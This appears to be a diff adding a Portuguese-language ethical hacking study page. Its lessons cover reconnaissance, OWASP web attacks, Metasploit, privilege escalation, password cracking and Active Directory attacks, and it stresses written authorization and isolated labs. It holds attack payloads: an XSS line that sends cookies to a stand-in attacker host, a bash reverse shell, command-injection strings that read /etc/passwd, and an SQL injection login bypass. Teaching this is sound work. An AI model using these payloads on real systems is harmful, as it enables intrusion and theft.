+						<a class="index-item-link" href="#mal-1" onclick="highlightNavItem(this)"><span>M1. Ciclo de Vida da Execução</span><span id="check-mal-1">○</span></a>
+						<a class="index-item-link" href="#mal-2" onclick="highlightNavItem(this)"><span>M2. Wipers (Destruição)</span><span id="check-mal-2">○</span></a>
+						<a class="index-item-link" href="#mal-3" onclick="highlightNavItem(this)"><span>M3. Infostealers</span><span id="check-mal-3">○</span></a>
+						<a class="index-item-link" href="#mal-4" onclick="highlightNavItem(this)"><span>M4. Ransomware Passo a Passo</span><span id="check-mal-4">○</span></a>
+						<a class="index-item-link" href="#mal-5" onclick="highlightNavItem(this)"><span>M5. RATs, Keyloggers &amp; Spyware</span><span id="check-mal-5">○</span></a>
+						<a class="index-item-link" href="#mal-6" onclick="highlightNavItem(this)"><span>M6. Rootkits &amp; Bootkits UEFI</span><span id="check-mal-6">○</span></a>
+						<a class="index-item-link" href="#mal-7" onclick="highlightNavItem(this)"><span>M7. Artefatos Forenses</span><span id="check-mal-7">○</span></a>
+						<a class="index-item-link" href="#mal-8" onclick="highlightNavItem(this)"><span>M8. Lab de Análise Seguro</span><span id="check-mal-8">○</span></a>
+						<a class="index-item-link" href="#mal-9" onclick="highlightNavItem(this)"><span>M9. Análise Prática &amp; IOCs</span><span id="check-mal-9">○</span></a>
+						<a class="index-item-link" href="#mal-10" onclick="highlightNavItem(this)"><span>M10. Casos Reais (WannaCry, NotPetya)</span><span id="check-mal-10">○</span></a>
+						<a class="index-item-link" href="#mal-11" onclick="highlightNavItem(this)"><span>M11. Defesa &amp; Regras Sigma</span><span id="check-mal-11">○</span></a>
+					</div>
+
+					<!-- Part 4 -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🟣 Parte 4 — Case Lumma Stealer</span>
+						</div>
+						<a class="index-item-link" href="#lumma-1" onclick="highlightNavItem(this)"><span>L1. Contexto &amp; Desmantelamento</span><span id="check-lumma-1">○</span></a>
+						<a class="index-item-link" href="#lumma-2" onclick="highlightNavItem(this)"><span>L2. Triagem Estática PE</span><span id="check-lumma-2">○</span></a>
+						<a class="index-item-link" href="#lumma-3" onclick="highlightNavItem(this)"><span>L3. Análise Dinâmica &amp; pe-sieve</span><span id="check-lumma-3">○</span></a>
+						<a class="index-item-link" href="#lumma-4" onclick="highlightNavItem(this)"><span>L4. Extração de Configuração C2</span><span id="check-lumma-4">○</span></a>
+						<a class="index-item-link" href="#lumma-5" onclick="highlightNavItem(this)"><span>L5. Relatório IOC &amp; MITRE</span><span id="check-lumma-5">○</span></a>
+						<a class="index-item-link" href="#lumma-6" onclick="highlightNavItem(this)"><span>L6. Regras YARA &amp; Sigma</span><span id="check-lumma-6">○</span></a>
+						<a class="index-item-link" href="#lumma-7" onclick="highlightNavItem(this)"><span>L7. Lições Fundamentais</span><span id="check-lumma-7">○</span></a>
+					</div>
+				</div>
+
+				<div class="progress-bar-wrap">
+					<div style="display: flex; justify-content: space-between; font-size: 11px; opacity: 0.8; font-weight: 700;">
+						<span>Progresso do Módulo</span>
+						<span id="sidebar-percent">0%</span>
+					</div>
+					<div class="study-progress-track">
+						<div class="study-progress-fill" id="sidebar-progress-fill"></div>
+					</div>
+					<button class="btn-primary" style="width: 100%; justify-content: center; font-size: 11px; padding: 7px; margin-top: 8px;" onclick="window.location.href='pentest.html'">
+						🛡️ Praticar na Jornada Hack
+					</button>
+				</div>
+			</aside>
+
+			<!-- Main Stream of Lessons -->
+			<main class="reader-content-stream" id="readerContentStream">
+
+				<!-- ==================== PARTE 1 ==================== -->
+				<div class="part-banner">
+					<div>
+						<div class="part-banner-title">🟢 Parte 1 — Fundamentos de Hacking &amp; Pentest</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Metodologia padrão, montagem de laboratório, varredura de redes, OWASP Top 10 e comandos essenciais.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(0, 240, 255, 0.2); border: 1px solid var(--accent-primary); color: var(--accent-primary) !important;">Nível Iniciante</span>
+				</div>
+
+				<!-- Tópico 1 -->
+				<article class="lesson-card" id="hack-1">
+					<h2 class="lesson-title">
+						<span class="num-badge">01</span>
+						<span>O que é Hacking &amp; Metodologia de Pentest</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Hacking</strong> é o processo de explorar sistemas para entender seu funcionamento em profundidade, encontrar falhas e (em contexto ético) corrigi-las. Há três classificações clássicas na comunidade:</p>
+						<ul>
+							<li><strong>White Hat:</strong> Hackers éticos que atuam sob contrato e autorização explícita.</li>
+							<li><strong>Black Hat:</strong> Indivíduos que atuam de forma ilegal ou maliciosa para ganho pessoal/destruição.</li>
+							<li><strong>Gray Hat:</strong> Intermediários que operam nas nuances — às vezes pesquisam sistemas sem autorização prévia, porém sem intenção destrutiva, reportando os achados aos responsáveis.</li>
+						</ul>
+						<p>O trabalho do pentester profissional segue um ciclo de metodologia padronizado:</p>
+						<ol>
+							<li><strong>Reconhecimento (Recon):</strong> Coleta passiva e ativa de informações sobre o alvo.</li>
+							<li><strong>Enumeração &amp; Scanning:</strong> Mapeamento da superfície de ataque, portas, serviços e versões.</li>
+							<li><strong>Exploração:</strong> Obtenção do primeiro ponto de acesso (Initial Access).</li>
+							<li><strong>Pós-exploração:</strong> Escalação de privilégios (virar root/SYSTEM) e persistência.</li>
+							<li><strong>Movimentação Lateral &amp; Pivoting:</strong> Expandir o alcance na rede interna.</li>
+							<li><strong>Relatório Técnico &amp; Executivo:</strong> Documentar vulnerabilidades, impacto e remediações.</li>
+						</ol>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-1')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 2 -->
+				<article class="lesson-card" id="hack-2">
+					<h2 class="lesson-title">
+						<span class="num-badge">02</span>
+						<span>Montando seu Laboratório Isolado</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="callout-box warning">
+							<div class="callout-header">⚠️ REGRA DE OURO DA SEGURANÇA</div>
+							Nunca execute ferramentas de varredura ou exploração contra sistemas reais de terceiros sem autorização prévia por escrito. Pratique exclusivamente dentro do seu ambiente virtualizado.
+						</div>
+						<p>Para aprender com segurança e sem riscos para sua rede doméstica, monte um ambiente isolado:</p>
+						<ul>
+							<li><strong>Virtualizadores:</strong> VirtualBox ou VMware Workstation Player (ambos gratuitos).</li>
+							<li><strong>Máquina Atacante:</strong> Kali Linux ou Parrot Security OS.</li>
+							<li><strong>Máquinas Alvo Vulneráveis:</strong> Metasploitable 2/3, máquinas do VulnHub (ex.: DC-1), DVWA (Damn Vulnerable Web App) e OWASP Juice Shop.</li>
+							<li><strong>Configuração de Rede:</strong> Configure os adaptadores de rede das VMs como <em>Host-Only</em> (Rede Interna) ou <em>NAT Network</em> isolada, garantindo que nenhum tráfego vaze para a internet.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-2')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 3 -->
+				<article class="lesson-card" id="hack-3">
+					<h2 class="lesson-title">
+						<span class="num-badge">03</span>
+						<span>Reconhecimento, OSINT &amp; Enumeração com Nmap</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>OSINT (Open Source Intelligence):</strong> Coleta de dados disponíveis publicamente sobre domínios e alvos.</p>
+						<ul>
+							<li><code>theHarvester</code>: Coleta e-mails, nomes de funcionários e subdomínios.</li>
+							<li><code>shodan.io</code> / <code>censys.io</code>: Mecanismos de busca de dispositivos, servidores e câmeras expostas na internet.</li>
+							<li><strong>Google Dorks:</strong> Operadores de busca avançados como <code>site:alvo.com filetype:pdf</code> ou <code>intitle:"index of"</code>.</li>
+						</ul>
+						<p><strong>Scanning de Rede com Nmap:</strong> A ferramenta fundamental para descobrir portas e versões de serviços.</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — Comandos Essenciais do Nmap</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># 1. Descoberta de hosts ativos na subnet local
+nmap -sn 192.168.1.0/24
+
+# 2. Scan completo de todas as 65535 portas com versão (-sV), scripts padrão (-sC) e modo agressivo (-A)
+nmap -sV -sC -p- -T4 -A 192.168.1.10 -oN scan_completo.txt
+
+# 3. Scan rápido nas top 1000 portas mais comuns
+nmap -sT --top-ports 1000 192.168.1.10</code></pre>
+						</div>
+
+						<p><strong>Portas Críticas Notáveis:</strong> 21 (FTP), 22 (SSH), 80/443 (HTTP/S), 445 (SMB), 3306 (MySQL), 3389 (RDP).</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — Enumeração de Serviços SMB &amp; Web</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># Enumeração SMB (Windows/Samba)
+enum4linux -a 192.168.1.10
+
+# Fuzzing de diretórios ocultos em servidores Web
+gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
+
+# Varredura de vulnerabilidades em servidor Web
+nikto -h http://192.168.1.10</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-3')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 4 -->
+				<article class="lesson-card" id="hack-4">
+					<h2 class="lesson-title">
+						<span class="num-badge">04</span>
+						<span>Exploração de Vulnerabilidades Web (OWASP Top 10)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>As vulnerabilidades web mais frequentes em aplicações modernas seguem os padrões do <strong>OWASP Top 10</strong>:</p>
+						
+						<h3 style="font-size: 16px; margin: 12px 0 6px; color: var(--accent-primary) !important;">1. SQL Injection (SQLi)</h3>
+						<p>Ocorre quando entradas de formulário são concatenadas diretamente em consultas SQL sem sanitização:</p>
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>SQL / BASH — Bypass de Login e Automação com sqlmap</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># Exemplo de payload em campo de login
+admin' OR '1'='1' --
+
+# Automação completa de extração de banco com sqlmap
+sqlmap -u "http://alvo/item.php?id=1" --dbs --batch</code></pre>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">2. Cross-Site Scripting (XSS)</h3>
+						<p>Injeção de JavaScript malicioso renderizado no navegador da vítima:</p>
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>HTML / JS — Prova de Conceito de Exfiltração de Cookie</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code>&lt;script&gt;fetch('http://atacante/?c=' + document.cookie)&lt;/script&gt;</code></pre>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">3. Command Injection</h3>
+						<p>Quando a aplicação passa parâmetros do usuário diretamente para o shell do sistema operacional:</p>
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — Encadeamento de Comandos</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code>127.0.0.1; cat /etc/passwd
+127.0.0.1 && whoami</code></pre>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">4. Upload Irrestrito de Arquivos</h3>
+						<p>Envio de scripts executáveis (como <code>shell.php</code>) mascarados com extensões alternativas (<code>.phtml</code>, <code>.php5</code>) ou alteração de <em>Content-Type</em> e <em>Magic Bytes</em>.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-4')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 5 -->
+				<article class="lesson-card" id="hack-5">
+					<h2 class="lesson-title">
+						<span class="num-badge">05</span>
+						<span>Exploração de Serviços, Metasploit &amp; Reverse Shells</span>
+					</h2>
+					<div class="lesson-body">
+						<p>O <strong>Metasploit Framework</strong> é o ecossistema mais utilizado no mundo para automação de testes de penetração e execução de payloads.</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>MSFCONSOLE — Fluxo Típico de Exploração</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code>msfconsole
+msf6> search eternalblue
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> set RHOSTS 192.168.1.10
+msf6> set LHOST 192.168.1.5
+msf6> exploit</code></pre>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-emerald) !important;">Reverse Shells Manuais</h3>
+						<p>Em um <em>reverse shell</em>, o computador da vítima estabelece conexão de volta para o atacante, ultrapassando firewalls que bloqueiam conexões de entrada:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — Netcat Listener &amp; Payload Linux</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># 1. Na máquina do atacante: abrir escuta na porta 4444
+nc -lvnp 4444
+
+# 2. Na máquina alvo vulnerável (payload Bash)
+bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
+
+# 3. Upgrade de shell básica para TTY interativa completa
+python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-5')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 6 -->
+				<article class="lesson-card" id="hack-6">
+					<h2 class="lesson-title">
+						<span class="num-badge">06</span>
+						<span>Escalação de Privilégio (Linux Privilege Escalation)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Após obter acesso inicial com um usuário comum (como <code>www-data</code>), o objetivo é elevar privilégios para <strong>root</strong>.</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — Enumeração de Privilégios no Linux</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># Verificar comandos autorizados via sudo sem senha
+sudo -l
+
+# Localizar binários com bit SUID ativado
+find / -perm -4000 2>/dev/null
+
+# Inspecionar crontabs e tarefas agendadas do sistema
+crontab -l; ls -la /etc/cron*
+
+# Listar usuários com login de shell interativo
+cat /etc/passwd | grep sh$</code></pre>
+						</div>
+
+						<p><strong>Ferramentas de Enumeração Automática:</strong> <code>LinPEAS.sh</code>, <code>LinEnum.sh</code> e <code>pspy</code> (para monitorar processos sem privilégios de root em tempo real).</p>
+						<p><strong>Referência Fundamental:</strong> Consulte sempre o repositório <a href="https://gtfobins.github.io" target="_blank" style="color: var(--accent-primary) !important; text-decoration: underline;">GTFOBins</a> para verificar abusos de binários do sistema com permissões SUID ou sudo.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-6')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 7 -->
+				<article class="lesson-card" id="hack-7">
+					<h2 class="lesson-title">
+						<span class="num-badge">07</span>
+						<span>Escalação de Privilégio (Windows Privilege Escalation)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>No Windows, a elevação de um usuário padrão para <strong>NT AUTHORITY\SYSTEM</strong> ou <strong>Administrator</strong> explora configurações errôneas:</p>
+						<ul>
+							<li><strong>Ferramentas Essenciais:</strong> <code>winPEAS.bat / .exe</code>, <code>PowerUp.ps1</code> (da suíte PowerSploit) e <code>windows-exploit-suggester</code>.</li>
+							<li><strong>Unquoted Service Path:</strong> Serviços com caminhos com espaços e sem aspas que permitem injeção de binários maliciosos na árvore de pastas.</li>
+							<li><strong>Permissões Fracas em Serviços:</strong> Serviços com permissão de escrita permitindo alterar o <code>binPath</code> para apontar para um reverse shell.</li>
+							<li><strong>AlwaysInstallElevated:</strong> Chaves de registro que autorizam pacotes MSI a instalarem com privilégios elevados de SYSTEM.</li>
+							<li><strong>Privilégios Abusáveis:</strong> <code>SeImpersonatePrivilege</code> (vetor de ataques Rotten/Juicy/GodPotato).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-7')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 8 -->
+				<article class="lesson-card" id="hack-8">
+					<h2 class="lesson-title">
+						<span class="num-badge">08</span>
+						<span>Quebra de Senhas &amp; Hashes (John &amp; Hashcat)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Diferença fundamental: <strong>John the Ripper</strong> e <strong>Hashcat</strong> realizam ataques offline de quebra de hashes com wordlists e regras matemáticas, enquanto <strong>Hydra</strong> executa força bruta online contra serviços de rede (SSH, FTP, HTTP).</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>BASH — John the Ripper &amp; Hashcat</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># Unir /etc/passwd com /etc/shadow e quebrar com John the Ripper
+unshadow passwd shadow > hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Hashcat acelerado por GPU:
+hashcat -m 0 -a 0 hashes.txt rockyou.txt         # Modo 0 = MD5
+hashcat -m 1000 ntlm.txt rockyou.txt             # Modo 1000 = NTLM (Windows)
+hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handshakes</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-8')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 9 -->
+				<article class="lesson-card" id="hack-9">
+					<h2 class="lesson-title">
+						<span class="num-badge">09</span>
+						<span>Ataques de Rede em Ambiente de Laboratório</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Em ambientes de rede local (LAN) isolados:</p>
+						<ul>
+							<li><strong>ARP Spoofing:</strong> Envenenamento de tabela ARP para se posicionar como Man-in-the-Middle (MitM) com <code>arpspoof</code> ou <code>Ettercap</code>.</li>
+							<li><strong>Sniffing &amp; Análise:</strong> Captura de pacotes de rede com <code>Wireshark</code> e <code>tcpdump</code>.</li>
+							<li><strong>Cracking WiFi WPA2:</strong> Captura de handshake 4-way via <code>airodump-ng</code> com desautenticação de clientes via <code>aireplay-ng</code>, seguido de quebra de senha via <code>aircrack-ng</code>.</li>
+							<li><strong>Engenharia Social Simulada:</strong> <code>Social-Engineer Toolkit (SET)</code> — restrito unicamente a campanhas expressamente autorizadas.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-9')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 10 -->
+				<article class="lesson-card" id="hack-10">
+					<h2 class="lesson-title">
+						<span class="num-badge">10</span>
+						<span>Criptografia Aplicada &amp; Desafios CTF</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Conceitos de criptografia aplicados a desafios de Capture The Flag (CTF):</p>
+						<ul>
+							<li><strong>Hashing:</strong> Funções unidirecionais (MD5, SHA-256). Senhas corporativas devem utilizar algoritmos lentos com salt como <em>bcrypt</em> ou <em>Argon2</em>.</li>
+							<li><strong>Cifras Clássicas:</strong> Cifra de César, Vigenère, ROT13 e codificações Base64/Hexadecimal.</li>
+							<li><strong>Ferramentas Essenciais:</strong> <code>CyberChef</code> (a "navalha suíça da web"), <code>hashid</code>, <code>xxd</code>.</li>
+							<li><strong>Plataformas Recomendadas para Prática Legal:</strong> TryHackMe, HackTheBox, picoCTF e CTFtime.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-10')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 11 -->
+				<article class="lesson-card" id="hack-11">
+					<h2 class="lesson-title">
+						<span class="num-badge">11</span>
+						<span>Boas Práticas do Hacker Ético &amp; Recursos de Estudo</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="callout-box tip">
+							<div class="callout-header">💡 PRINCÍPIOS DE CONDUTA PROFISSIONAL</div>
+							1. Obtenha autorização por escrito (termo de consentimento) antes de testar.<br>
+							2. Documente cada evidência, comando e impacto.<br>
+							3. Nunca destrua ou exfiltre dados reais de clientes.<br>
+							4. Reporte falhas responsavelmente através de programas legítimos de Bug Bounty.
+						</div>
+
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Recurso de Estudo</th>
+										<th>Foco Principal</th>
+										<th>Acesso</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><strong>PortSwigger Web Security Academy</strong></td>
+										<td>Web Hacking, SQLi, XSS, CSRF, SSRF</td>
+										<td>Gratuito</td>
+									</tr>
+									<tr>
+										<td><strong>TryHackMe / HackTheBox</strong></td>
+										<td>Labs práticos guiados e máquinas estilo CTF</td>
+										<td>Freemium</td>
+									</tr>
+									<tr>
+										<td><strong>OverTheWire (Bandit)</strong></td>
+										<td>Fundamentos de Linux e Shell Script</td>
+										<td>Gratuito</td>
+									</tr>
+									<tr>
+										<td><strong>The Web Application Hacker's Handbook</strong></td>
+										<td>A bíblia de arquitetura e segurança web</td>
+										<td>Livro / Referência</td>
+									</tr>
+									<tr>
+										<td><strong>HackTricks (book.hacktricks.xyz)</strong></td>
+										<td>Cheat sheet completo de privesc e enumeração</td>
+										<td>Gratuito / Aberto</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-11')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+
+				<!-- ==================== PARTE 2 ==================== -->
+				<div class="part-banner" style="border-color: var(--accent-gold); box-shadow: 0 6px 30px rgba(255, 214, 10, 0.15);">
+					<div>
+						<div class="part-banner-title">🟡 Parte 2 — Hacking Intermediário &amp; Redes Corporativas</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Active Directory, pivoting entre redes, exploração de binários, roteiro de 90 dias e história hacker.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(255, 214, 10, 0.2); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important;">Nível Intermediário</span>
+				</div>
+
+				<!-- Tópico 12 -->
+				<article class="lesson-card" id="hack-12">
+					<h2 class="lesson-title">
+						<span class="num-badge">12</span>
+						<span>Um CTF Passo a Passo (Linux Beginner Box)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Simulação do fluxo completo de resolução em uma máquina estilo VulnHub / TryHackMe:</p>
+						
+						<p><strong>Etapa 1 — Descoberta de IP:</strong></p>
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>nmap -sn 192.168.1.0/24   # Encontrou: 192.168.1.50</code></pre>
+						</div>
+
+						<p><strong>Etapa 2 — Enumeração Completa:</strong></p>
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>nmap -sV -sC -A 192.168.1.50 -p- -oN full.txt
+# Portas abertas: 22 (SSH), 80 (HTTP), 3306 (MySQL)
+
+# Fuzzing de pastas na porta 80:
+gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak</code></pre>
+						</div>
+
+						<p><strong>Etapa 3 — Exploração:</strong> Login vulnerável via SQLi ou credenciais vazadas em notas <code>.bak</code> permitindo acesso SSH.</p>
+
+						<p><strong>Etapa 4 — Flag de Usuário &amp; Escalação de Privilégio:</strong></p>
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Ver comandos sudo liberados:
+sudo -l
+# Se /usr/bin/vim estiver liberado sem senha:
+sudo vim -c ':!/bin/sh'
+# Agora você é root: cat /root/root.txt</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-12')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 13 -->
+				<article class="lesson-card" id="hack-13">
+					<h2 class="lesson-title">
+						<span class="num-badge">13</span>
+						<span>Active Directory — O Chefão Corporativo</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Conceitos fundamentais da arquitetura de domínios corporativos Windows:</p>
+						<ul>
+							<li><strong>Domain Controller (DC):</strong> Servidor central que gerencia autenticação, usuários e políticas.</li>
+							<li><strong>Kerberos:</strong> Protocolo de autenticação baseado em bilhetes (TGT e TGS).</li>
+							<li><strong>NTLM:</strong> Autenticação legada baseada em hash, suscetível a ataques de Relay.</li>
+							<li><strong>BloodHound:</strong> Mapeia grafos de relacionamento e caminhos curtos até <em>Domain Admin</em>.</li>
+						</ul>
+
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Vetor de Ataque AD</th>
+										<th>Descrição</th>
+										<th>Ferramenta</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><strong>AS-REP Roasting</strong></td>
+										<td>Contas com pré-autenticação Kerberos desabilitada</td>
+										<td><code>GetNPUsers.py</code></td>
+									</tr>
+									<tr>
+										<td><strong>Kerberoasting</strong></td>
+										<td>Solicitação de TGS de contas de serviço para quebra offline</td>
+										<td><code>GetUserSPNs.py</code> + Hashcat</td>
+									</tr>
+									<tr>
+										<td><strong>Pass-the-Hash (PtH)</strong></td>
+										<td>Autenticação remota usando diretamente o hash NTLM</td>
+										<td><code>impacket-psexec</code> / CrackMapExec</td>
+									</tr>
+									<tr>
+										<td><strong>NTLM Relay</strong></td>
+										<td>Redirecionar solicitações de autenticação capturadas</td>
+										<td><code>Responder</code> + <code>ntlmrelayx</code></td>
+									</tr>
+									<tr>
+										<td><strong>Abuso de ACLs</strong></td>
+										<td>Permissões excessivas (GenericAll, WriteDacl) em objetos</td>
+										<td><code>PowerView</code> / BloodHound</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~6 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-13')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 14 -->
+				<article class="lesson-card" id="hack-14">
+					<h2 class="lesson-title">
+						<span class="num-badge">14</span>
+						<span>Pivoting, Túneis &amp; Movimentação Lateral</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Quando você compromete um host na DMZ, outras redes internas ficam inacessíveis diretamente. O <strong>Pivoting</strong> roteia o tráfego do atacante através do host intermediário comprometido:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header">
+								<span>MSFCONSOLE &amp; BASH — SOCKS Proxy &amp; Proxychains</span>
+								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
+							</div>
+							<pre><code># No Meterpreter:
+meterpreter> run autoroute -s 10.0.1.0/24
+meterpreter> background
+msf6> use auxiliary/server/socks_proxy
+
+# No Kali: usar proxychains para direcionar Nmap pela rede interna
+proxychains nmap -sT -sV -Pn 10.0.1.20</code></pre>
+						</div>
+						<p><strong>Alternativas Modernas:</strong> Túneis SSH locais (<code>ssh -L</code>), <code>ligolo-ng</code> e <code>chisel</code>.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-14')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 15 -->
+				<article class="lesson-card" id="hack-15">
+					<h2 class="lesson-title">
+						<span class="num-badge">15</span>
+						<span>Segurança em Nível Binário &amp; Memória</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Buffer Overflow (x86/x64):</strong> Ocorre quando uma entrada de dados excede o tamanho do buffer alocado na memória stack, sobrescrevendo ponteiros de instrução como o <code>EIP</code> ou <code>RIP</code>:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>C — Exemplo Clássico de Vulnerabilidade de Memória</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>void vuln(char *input) {
+    char buf[64];
+    strcpy(buf, input);   // Sem validação de tamanho → estoura buffer
+}</code></pre>
+						</div>
+
+						<p><strong>Mitigações Modernas:</strong> ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), Stack Canaries e CFG.</p>
+					</div>
